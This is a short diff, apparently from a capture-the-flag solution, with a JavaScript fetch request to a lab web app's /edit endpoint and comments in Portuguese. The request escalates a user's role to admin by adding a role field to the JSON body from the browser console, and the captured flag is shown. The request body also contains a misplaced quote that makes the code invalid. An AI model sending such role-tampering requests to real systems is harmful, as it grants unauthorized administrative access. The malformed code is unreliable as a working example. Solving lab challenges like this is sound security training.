@@ -7,9 +7,10 @@ await fetch("http://box4-806822361.us-east-1.elb.amazonaws.com/edit", {
         "Content-Type": "application/json"
     },
     "referrer": "http://box4-806822361.us-east-1.elb.amazonaws.com/edit",
-    "body": "{\"username\":\"user\", \"role\":\"admin"\"}",
+    "body": "{\"username\":\"user\", \"role\":\"admin"\"}", // role - admin acrescentado
     "method": "POST",
     "mode": "cors"
 });
 
 // **FLAG{RESTRICTED_ACCESS}**
+// Escalacao de Privilegios com o fetch no console do DevTools, usando o Networking e vendo a permissao de edicao do escopo cadastral, mude a role para admin
